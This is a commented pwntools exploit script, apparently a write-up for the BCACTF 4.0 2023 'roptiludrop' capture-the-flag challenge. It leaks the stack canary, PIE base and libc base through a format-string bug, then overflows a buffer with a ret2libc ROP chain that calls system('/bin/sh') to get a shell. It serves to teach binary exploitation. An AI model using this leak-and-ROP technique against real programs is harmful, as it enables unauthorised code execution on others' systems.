from pwn import *

# roptiludrop - BCACTF 4.0 2023

# checksec analysis
# full relro, canary found, nx enabled, pie enabled, not stripped and dynamically
# linked

# first approach by looking at the code in ghidra would be to run a shell with 
# system(“/bin/sh”) overwriting the stack to see what vulnerabilities the code 
# has. The binary uses a gets without looking at any read limits and then reads 
# in a 24byte buf with fread that can read up to 0x50 characters. As it is a pwn
# challenge you can clearly see the vulnerabilities.

# the end result of the explotacoin would be to open a shell to read the flag. To
# do this, we need to redirect the program using ret2libc to the libc system
# function. To do this, we need to bypass several defense mechanisms such as
# canary, ASLR, PIE and NX. We will read the base addresses of the binary, libc
# and the canary in order to develop our ROP.

context.arch = "amd64"

# patch binary
# we use pwninit to link the binary with the libc-2.31.so library. This way it 
# is done automatically. 

b = ELF('./roptiludrop_patched')
libc = ELF('./libc-2.31.so')

r = process(b.path)

# gdb.attach(r, "b *life+161")


# we leak the addresses by exploiting the printf bug, string format bug. 
# how do we know that the address 9 and 11 have valid information? first we have
# done a little fuzzing to see the addresses that we can use. the 9 is the copy
# of the canary (checking with gdb and always ends with 00 in linux). We realize
# that printf reads values from the stack from the bottom to the top, knowing
# that 9 is the canary we know that 11 is the return address of the life
# function to the main. 

# +--------------------+  
# |       RET         |  <-- what we want to overwrite to get the shell
# +--------------------+ <-- RBP
# |       RBP         |  
# +--------------------+
# |      Canary       |  
# +--------------------+
# |     buf[24]       |  
# +--------------------+ <-- RSP


r.recvuntil("> ")
r.sendline(b'%9$p %11$p')
line = r.recvline()

# extract leaked addresses from output
parts = str(line).split("What is this?")
parts2 = parts[0].split(" ")
canary = parts2[0].strip()[2:]

piebase_guess = parts2[1].split(" ")[0]
print(piebase_guess)

# 0x1332 is the offset of the life return function. It is the next instruction
# line of the life function in main. 
piebase = int(piebase_guess,16) - int("0x1332", 16)
print("piebase leaked: "+ hex(piebase))

printf_address = parts[1].strip()[:-3]
print("canary leaked: "+ canary)

# they give us a help and read the printf address. With this address we
# calculate the base address of libc. 
libc_address = int(printf_address, 16) - libc.sym.printf
print("libc address leaked: "+ hex(libc_address))

system_address = libc_address + libc.sym.system
sh_address = libc_address + next(libc.search("/bin/sh"))

pop_rdi = next(b.search(asm("pop rdi; ret")))
pop_rdi = piebase + pop_rdi

# why do we want to put a ret instruction if it does nothing? without it the
# stack remains unaligned with 16 bytes. And to execute system is necessary. I
# realized it because at the beginning I didn't have added this ret instruction
# in the payload and it crashed. Debugging with gdb I realized that the payload
# was ok a priori because the program redirected to system and the RDI register
# had “/bin/sh” but in the instruction movaps XMMWORD PTR [rsp+0x50], xmm0 the
# program crashed. Investigating a little I realized that the stack was not
# aligned to 16 bytes so I put the ret to have the exploit aligned and working. 

ret = next(b.search(asm("ret")))
ret = piebase + ret

# buf + canary + rbp + ret
# i know there are many ways to build a payload. With the ROP class provided by
# pwntools you can create the payload easier and in a more elegant way. But I
# wanted to do it this way to better understand the stack and how the exploit
# works. 
buf = b'A' * 24
payload = buf + p64(int(canary, 16)) + b'JUNKJUNK' + p64(pop_rdi) + \
    p64(sh_address) + p64(ret) + p64(system_address) + b'B' * 8

r.recvuntil("> ")
r.sendline(payload)

r.interactive()

# references:
# https://github.com/guyinatuxedo/nightmare/issues/44
# https://www.youtube.com/watch?v=T03idxny9jE&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=14
